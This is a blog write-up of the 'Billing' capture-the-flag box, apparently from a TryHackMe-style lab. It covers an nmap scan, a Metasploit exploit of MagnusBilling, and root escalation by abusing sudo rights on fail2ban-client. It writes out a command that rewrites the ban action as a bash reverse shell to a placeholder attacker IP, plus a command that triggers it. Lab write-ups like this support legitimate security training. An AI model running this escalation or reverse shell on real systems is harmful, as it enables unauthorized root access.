---
title: "BILLING"
date: 2025-11-24T01:22:11-0900
draft: false
categories: ["Security"]
tags: ["Enumeration"]
Description: A box to test your enumeration and privilege escalation skills
---


***
Difficulty: Easy

![](https://i.imgur.com/b0ZPJey.png)

***

***
I started this box with `Pull up` by Legendary ZerryDL after been away from boxes for a while due to personal reasons

<iframe style="border-radius:12px" src="https://open.spotify.com/embed/track/4bMbA8VYJMC2QKJYH8PDpr?utm_source=generator" width="100%" height="352" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture" loading="lazy"></iframe>

***


Another night to pull up againn, We go againnnnn

Ion know what this box is all about what we are about to find out innit 

As we know the first thing is to get our nmap rolling 

```
nmap -p- -T4 -v --min-rate=1000 -sCV 10.10.228.118 -oN nmap.txt -Pn
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-01 21:09 EDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
Initiating NSE at 21:09
Completed NSE at 21:09, 0.00s elapsed
Initiating SYN Stealth Scan at 21:09
Scanning biling.thm (10.10.228.118) [65535 ports]
Discovered open port 22/tcp on 10.10.228.118
Discovered open port 80/tcp on 10.10.228.118
Discovered open port 3306/tcp on 10.10.228.118
Increasing send delay for 10.10.228.118 from 0 to 5 due to max_successful_tryno increase to 5
Increasing send delay for 10.10.228.118 from 5 to 10 due to max_successful_tryno increase to 6
Warning: 10.10.228.118 giving up on port because retransmission cap hit (6).
SYN Stealth Scan Timing: About 41.60% done; ETC: 21:10 (0:00:44 remaining)
Discovered open port 5038/tcp on 10.10.228.118
Completed SYN Stealth Scan at 21:11, 87.03s elapsed (65535 total ports)
Initiating Service scan at 21:11
Scanning 4 services on biling.thm (10.10.228.118)
Completed Service scan at 21:11, 7.01s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.228.118.
Initiating NSE at 21:11
Completed NSE at 21:11, 5.33s elapsed
Initiating NSE at 21:11
Completed NSE at 21:11, 1.07s elapsed
Initiating NSE at 21:11
Completed NSE at 21:11, 0.01s elapsed
Nmap scan report for biling.thm (10.10.228.118)
Host is up (0.23s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
| ssh-hostkey: 
|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)
|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)
|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)
80/tcp   open  http     Apache httpd 2.4.56 ((Debian))
| http-robots.txt: 1 disallowed entry 
|_/mbilling/
| http-title:             MagnusBilling        
|_Requested resource was http://biling.thm/mbilling/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.56 (Debian)
3306/tcp open  mysql    MariaDB 10.3.23 or earlier (unauthorized)
5038/tcp open  asterisk Asterisk Call Manager 2.10.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 21:11
Completed NSE at 21:11, 0.01s elapsed
Initiating NSE at 21:11
Completed NSE at 21:11, 0.01s elapsed
Initiating NSE at 21:11
Completed NSE at 21:11, 0.01s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 105.13 seconds
           Raw packets sent: 86086 (3.788MB) | Rcvd: 76850 (3.255MB)


```


Lots of endpoints are located hereee, this is looking good alreadyyyy

From the nmap scan, we discovered that they are 3 ports opened (22, 80, 3395, 5038)

Let us start our directory search too while enumerating the website

![](https://i.imgur.com/qDY7x28.png)


Now over to the website

![](https://i.imgur.com/wBc6AO8.png)


Let us go back to our directory fuzzing

![](https://i.imgur.com/9bCVgpV.png)

From there we were able to find the endpoint /robots.txt which still takes us to the login page

So, let us try to get another thing

Let us try enumerating the mysql

Enumerating this left us with no luck either.......

So I just went ahead googling to see if there is and exploit for magnus billing CMS. Lo and behold there is an exploit for that...

We are going to be using metasplot this time around

![](https://i.imgur.com/Rc91tj1.png)


Bankaiii, we have initial access as seen below

![](https://i.imgur.com/mXjjRs4.png)

Let us now go to find user flag

![](https://i.imgur.com/GZyX84g.png)

Our work is halfdone, now let us go all in for the root flag

So, now in this part root is kinda trickyyyyy but imma still explain to the best of my knowledge

So after getting user flag, the first thing I always do is to try `sudo -l` to have a list of things that this user can do and this time was not in any way different

After running the command, the following was that I got

```
Matching Defaults entries for asterisk on Billing: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin 

Runas and Command-specific defaults for asterisk: Defaults!/usr/bin/fail2ban-client !requiretty 

User asterisk may run the following commands on Billing: (ALL) NOPASSWD: /usr/bin/fail2ban-client

```

From here all I knew was to abuse fail2ban to pop root shell and https://juggernaut-sec.com/fail2ban-lpe/ was the blog that helped me out

With all of this information, I crafted the following command:
```
sudo /usr/bin/fail2ban-client set sshd action iptables-multiport actionban "/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1'"

```

This command modifies the `actionban` rule for the `sshd` jail, replacing the default IP banning action with a reverse shell payload. Normally, Fail2Ban executes the `iptables-multiport` action to ban IP addresses attempting brute-force attacks. However, by injecting my command, I ensure that instead of banning an IP, Fail2Ban will execute my reverse shell.

After modifying the `actionban` rule, I set up a listener on my machine to catch the reverse shell connection.

Lastly, I executed the following command:
```
sudo /usr/bin/fail2ban-client set sshd banip 127.0.0.1
```

This command is typically used to manually ban an IP address using Fail2Ban. However, since I had previously modified the `actionban` rule to execute my reverse shell payload instead of banning an IP, running this command triggered the exploit. I used `127.0.0.1` because it is the **localhost IP address**, meaning the machine essentially "bans itself." Since Fail2Ban is configured to execute the `actionban` command whenever an IP is banned, triggering the ban on `127.0.0.1` ensures that the malicious command runs immediately on the same system without external dependencies.

BecauseFail2Ban runs with elevated privileges, the shell was spawned with **root** access, successfully granting me full control over the system.

![](https://i.imgur.com/posPY62.png)

With the root shell successfully obtained, I navigated to the `/root` directory and accessed the final flag!

![](https://i.imgur.com/VlS9ATs.png)


<button onclick="window.location.href='https://R3D-Z3E.github.io';">Back To Home螥</button>
